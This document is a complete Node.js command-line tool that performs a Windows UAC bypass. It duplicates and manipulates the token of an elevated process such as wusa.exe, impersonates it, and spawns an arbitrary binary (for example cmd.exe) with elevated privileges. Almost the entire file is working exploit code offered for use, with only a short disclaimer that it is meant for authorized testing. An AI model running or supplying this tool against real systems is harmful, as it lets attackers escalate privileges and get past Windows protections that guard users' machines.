#!/usr/bin/env node

/**
 * UAC Bypass Utility for Windows Security Testing
 * Node.js implementation of UAC token manipulation
 *
 * IMPORTANT: This tool is for authorized security testing only.
 * Use only in pentesting engagements, CTF challenges, or security research.
 */

const koffi = require('koffi');

// Define Windows structures
const PROCESS_INFORMATION = koffi.struct('PROCESS_INFORMATION', {
    hProcess: 'void*',
    hThread: 'void*',
    dwProcessId: 'uint32',
    dwThreadId: 'uint32'
});

const SECURITY_ATTRIBUTES = koffi.struct('SECURITY_ATTRIBUTES', {
    nLength: 'int32',
    lpSecurityDescriptor: 'void*',
    bInheritHandle: 'int32'
});

const SID_AND_ATTRIBUTES = koffi.struct('SID_AND_ATTRIBUTES', {
    Sid: 'void*',
    Attributes: 'uint32'
});

const TOKEN_MANDATORY_LABEL = koffi.struct('TOKEN_MANDATORY_LABEL', {
    Label: SID_AND_ATTRIBUTES
});

const STARTUPINFOW = koffi.struct('STARTUPINFOW', {
    cb: 'uint32',
    lpReserved: 'char16*',
    lpDesktop: 'char16*',
    lpTitle: 'char16*',
    dwX: 'uint32',
    dwY: 'uint32',
    dwXSize: 'uint32',
    dwYSize: 'uint32',
    dwXCountChars: 'uint32',
    dwYCountChars: 'uint32',
    dwFillAttribute: 'uint32',
    dwFlags: 'uint32',
    wShowWindow: 'uint16',
    cbReserved2: 'uint16',
    lpReserved2: 'void*',
    hStdInput: 'void*',
    hStdOutput: 'void*',
    hStdError: 'void*'
});

const SHELLEXECUTEINFOW = koffi.struct('SHELLEXECUTEINFOW', {
    cbSize: 'int32',
    fMask: 'uint32',
    hwnd: 'void*',
    lpVerb: 'char16*',
    lpFile: 'char16*',
    lpParameters: 'char16*',
    lpDirectory: 'char16*',
    nShow: 'int32',
    hInstApp: 'void*',
    lpIDList: 'void*',
    lpClass: 'char16*',
    hkeyClass: 'void*',
    dwHotKey: 'uint32',
    hIcon: 'void*',
    hProcess: 'void*'
});

const SID_IDENTIFIER_AUTHORITY = koffi.struct('SID_IDENTIFIER_AUTHORITY', {
    Value: koffi.array('uint8', 6)
});

// Load Windows DLLs and define functions
const kernel32 = koffi.load('kernel32.dll');
const advapi32 = koffi.load('advapi32.dll');
const ntdll = koffi.load('ntdll.dll');
const shell32 = koffi.load('shell32.dll');

// Kernel32 functions
const OpenProcess = kernel32.func('OpenProcess', 'void*', ['uint32', 'bool', 'uint32']);
const TerminateProcess = kernel32.func('TerminateProcess', 'bool', ['void*', 'uint32']);
const GetLastError = kernel32.func('GetLastError', 'uint32', []);

// Advapi32 functions
const OpenProcessToken = advapi32.func('OpenProcessToken', 'bool', ['void*', 'uint32', 'void**']);
const DuplicateTokenEx = advapi32.func('DuplicateTokenEx', 'bool', [
    'void*',
    'uint32',
    koffi.pointer(SECURITY_ATTRIBUTES),
    'int32',
    'int32',
    'void**'
]);
const AllocateAndInitializeSid = advapi32.func('AllocateAndInitializeSid', 'bool', [
    koffi.pointer(SID_IDENTIFIER_AUTHORITY),
    'uint8',
    'uint32', 'uint32', 'uint32', 'uint32',
    'uint32', 'uint32', 'uint32', 'uint32',
    'void**'
]);
const ImpersonateLoggedOnUser = advapi32.func('ImpersonateLoggedOnUser', 'bool', ['void*']);
const CreateProcessWithLogonW = advapi32.func('CreateProcessWithLogonW', 'bool', [
    'char16*',  // userName
    'char16*',  // domain
    'char16*',  // password
    'uint32',   // logonFlags
    'char16*',  // applicationName
    'char16*',  // commandLine
    'uint32',   // creationFlags
    'void*',    // environment
    'char16*',  // currentDirectory
    koffi.out(koffi.pointer(STARTUPINFOW)),
    koffi.out(koffi.pointer(PROCESS_INFORMATION))
]);

// Ntdll functions
const NtSetInformationToken = ntdll.func('NtSetInformationToken', 'int32', [
    'void*',
    'int32',
    koffi.pointer(TOKEN_MANDATORY_LABEL),
    'int32'
]);
const NtFilterToken = ntdll.func('NtFilterToken', 'int32', [
    'void*',
    'uint32',
    'void*',
    'void*',
    'void*',
    'void**'
]);

// Shell32 functions
const ShellExecuteExW = shell32.func('ShellExecuteExW', 'bool', [koffi.pointer(SHELLEXECUTEINFOW)]);

// Constants
const TOKEN_QUERY = 0x0008;
const TOKEN_DUPLICATE = 0x0002;
const TOKEN_ASSIGN_PRIMARY = 0x0001;
const TOKEN_IMPERSONATE = 0x0004;
const TOKEN_ALL_ACCESS = 0xf01ff;
const MAXIMUM_ALLOWED = 0x02000000;
const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
const SecurityImpersonation = 2;
const TokenPrimary = 1;
const TokenImpersonation = 2;
const SE_GROUP_INTEGRITY = 0x20;
const LOGON_NETCREDENTIALS_ONLY = 0x00000002;
const CREATE_UNICODE_ENVIRONMENT = 0x00000400;
const CREATE_NO_WINDOW = 0x08000000;
const SEE_MASK_NOCLOSEPROCESS = 0x40;
const SW_HIDE = 0x0;
const SW_SHOW = 0x1;
const STARTF_USESHOWWINDOW = 0x00000001;
const TokenIntegrityLevel = 25;
const LUA_TOKEN = 0x4;

// Utility functions
function log(message) {
    console.log(`[*] ${message}`);
}

function error(message) {
    console.log(`[!] ${message}`);
}

function success(message) {
    console.log(`[+] ${message}`);
}

function testElevatedAccess() {
    try {
        const fs = require('fs');
        const testPath = 'C:\\Windows\\System32\\test.txt';
        fs.writeFileSync(testPath, 'test');
        fs.unlinkSync(testPath);
        return true;
    } catch (err) {
        return false;
    }
}

// Main UAC bypass function
function performUACBypass(binPath, args, procPID) {
    log('Starting UAC bypass process...');

    // Test if already elevated
    if (testElevatedAccess()) {
        error('Session is already elevated!');
        process.exit(1);
    } else {
        log('Session is not elevated - proceeding with bypass');
    }

    let hProcess;
    let shellInfo;

    if (procPID) {
        // Use existing process
        log(`Attempting to use process PID: ${procPID}`);
        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, procPID);

        if (!hProcess || hProcess === null) {
            error('Failed to get process handle!');
            error(`Last error: ${GetLastError()}`);
            process.exit(1);
        }
        log(`Successfully acquired process handle for PID ${procPID}`);
    } else {
        // Create new WUSA process
        log('Creating WUSA process...');
        shellInfo = {
            cbSize: koffi.sizeof(SHELLEXECUTEINFOW),
            fMask: SEE_MASK_NOCLOSEPROCESS,
            hwnd: null,
            lpVerb: null,
            lpFile: 'wusa.exe',
            lpParameters: null,
            lpDirectory: null,
            nShow: SW_HIDE,
            hInstApp: null,
            lpIDList: null,
            lpClass: null,
            hkeyClass: null,
            dwHotKey: 0,
            hIcon: null,
            hProcess: null
        };

        const result = ShellExecuteExW(shellInfo);
        if (!result) {
            error('Failed to create WUSA process!');
            error(`Last error: ${GetLastError()}`);
            process.exit(1);
        }
        log('WUSA process created');
        hProcess = shellInfo.hProcess;
    }

    // Open process token
    log('Opening process token...');
    const hToken = [null];
    if (!OpenProcessToken(hProcess, MAXIMUM_ALLOWED, hToken)) {
        error('Failed to open process token!');
        error(`Last error: ${GetLastError()}`);
        process.exit(1);
    }
    log('Opened process token');

    // Duplicate token
    log('Duplicating process token...');
    const hNewToken = [null];
    const secAttr = {
        nLength: koffi.sizeof(SECURITY_ATTRIBUTES),
        lpSecurityDescriptor: null,
        bInheritHandle: 0
    };

    if (!DuplicateTokenEx(
        hToken[0],
        TOKEN_ALL_ACCESS,
        secAttr,
        SecurityImpersonation,
        TokenPrimary,
        hNewToken
    )) {
        error('Failed to duplicate process token!');
        error(`Last error: ${GetLastError()}`);
        process.exit(1);
    }
    log('Duplicated process token');

    // Initialize SID for medium integrity level
    log('Initializing MedIL SID...');
    const sidAuth = {
        Value: [0x0, 0x0, 0x0, 0x0, 0x0, 0x10]
    };

    const pSID = [null];
    if (!AllocateAndInitializeSid(
        sidAuth,
        1,
        0x2000, 0, 0, 0, 0, 0, 0, 0,
        pSID
    )) {
        error('Failed to initialize SID!');
        error(`Last error: ${GetLastError()}`);
        process.exit(1);
    }
    log('Initialized MedIL SID');

    // Set token integrity level
    log('Setting token mandatory IL...');
    const tokenLabel = {
        Label: {
            Sid: pSID[0],
            Attributes: SE_GROUP_INTEGRITY
        }
    };

    const ntStatus = NtSetInformationToken(
        hNewToken[0],
        TokenIntegrityLevel,
        tokenLabel,
        koffi.sizeof(TOKEN_MANDATORY_LABEL)
    );

    if (ntStatus !== 0) {
        error('Failed to modify token!');
        error(`NT Status: ${ntStatus}`);
        process.exit(1);
    }
    log('Lowered token mandatory IL');

    // Create restricted token
    log('Creating restricted token...');
    const luaToken = [null];
    const ntStatus2 = NtFilterToken(
        hNewToken[0],
        LUA_TOKEN,
        null,
        null,
        null,
        luaToken
    );

    if (ntStatus2 !== 0) {
        error('Failed to create restricted token!');
        error(`NT Status: ${ntStatus2}`);
        process.exit(1);
    }
    log('Created restricted token');

    // Duplicate restricted token
    log('Duplicating restricted token...');
    const hFinalToken = [null];
    const secAttr2 = {
        nLength: koffi.sizeof(SECURITY_ATTRIBUTES),
        lpSecurityDescriptor: null,
        bInheritHandle: 0
    };

    if (!DuplicateTokenEx(
        luaToken[0],
        TOKEN_IMPERSONATE | TOKEN_QUERY,
        secAttr2,
        SecurityImpersonation,
        TokenImpersonation,
        hFinalToken
    )) {
        error('Failed to duplicate restricted token!');
        error(`Last error: ${GetLastError()}`);
        process.exit(1);
    }
    log('Duplicated restricted token');

    // Impersonate security context
    log('Impersonating security context...');
    if (!ImpersonateLoggedOnUser(hFinalToken[0])) {
        error('Failed to impersonate context!');
        error(`Last error: ${GetLastError()}`);
        process.exit(1);
    }
    log('Successfully impersonated security context');

    // Prepare to spawn elevated process
    log('Preparing to spawn elevated process...');
    const startupInfo = {
        cb: koffi.sizeof(STARTUPINFOW),
        lpReserved: null,
        lpDesktop: null,
        lpTitle: null,
        dwX: 0,
        dwY: 0,
        dwXSize: 0,
        dwYSize: 0,
        dwXCountChars: 0,
        dwYCountChars: 0,
        dwFillAttribute: 0,
        dwFlags: STARTF_USESHOWWINDOW,
        wShowWindow: SW_SHOW,
        cbReserved2: 0,
        lpReserved2: null,
        hStdInput: null,
        hStdOutput: null,
        hStdError: null
    };

    const processInfo = {
        hProcess: null,
        hThread: null,
        dwProcessId: 0,
        dwThreadId: 0
    };

    const currentDir = process.env.SystemRoot || 'C:\\Windows';
    const commandLine = args ? `${binPath} ${args}` : binPath;

    // Spawn elevated process
    log(`Spawning: ${commandLine}`);
    if (!CreateProcessWithLogonW(
        'aaa',
        'bbb',
        'ccc',
        LOGON_NETCREDENTIALS_ONLY,
        binPath,
        commandLine,
        CREATE_NO_WINDOW,
        null,
        currentDir,
        startupInfo,
        processInfo
    )) {
        error('Failed to create process!');
        error(`Last error: ${GetLastError()}`);
        process.exit(1);
    }

    success('Magic... Process spawned with elevated privileges!');
    log(`Process ID: ${processInfo.dwProcessId}`);

    // Cleanup: Kill WUSA if we created it
    if (!procPID && shellInfo) {
        log('Cleaning up WUSA process...');
        TerminateProcess(shellInfo.hProcess, 1);
    }

    log('UAC bypass completed successfully!');
}

// CLI argument parsing
function main() {
    const args = process.argv.slice(2);

    if (args.length === 0 || args.includes('--help') || args.includes('-h')) {
        console.log(`
UAC Bypass Tool - Node.js Implementation
=========================================

IMPORTANT: For authorized security testing only!
Use only in pentesting engagements, CTF challenges, or security research.

Usage:
  node index.js <binary_path> [arguments] [--pid <process_id>]

Options:
  <binary_path>     Path to the executable to run elevated (required)
  [arguments]       Arguments to pass to the executable (optional)
  --pid <id>        Use existing process instead of WUSA (optional)
  --help, -h        Show this help message

Examples:
  node index.js C:\\Windows\\System32\\cmd.exe
  node index.js C:\\Windows\\System32\\cmd.exe "/c whoami /priv"
  node index.js C:\\Windows\\System32\\cmd.exe --pid 1234

Requirements:
  - Windows OS
  - Node.js 12.0.0 or higher
  - Run 'npm install' before first use
        `);
        process.exit(0);
    }

    // Parse arguments
    let binPath = args[0];
    let procArgs = '';
    let procPID = null;

    for (let i = 1; i < args.length; i++) {
        if (args[i] === '--pid' && i + 1 < args.length) {
            procPID = parseInt(args[i + 1]);
            i++; // Skip next arg
        } else {
            procArgs += (procArgs ? ' ' : '') + args[i];
        }
    }

    // Validate inputs
    if (!binPath) {
        error('Binary path is required!');
        process.exit(1);
    }

    // Run the bypass
    try {
        performUACBypass(binPath, procArgs, procPID);
    } catch (err) {
        error(`Unexpected error: ${err.message}`);
        console.error(err.stack);
        process.exit(1);
    }
}

// Run if executed directly
if (require.main === module) {
    main();
}

module.exports = { performUACBypass };
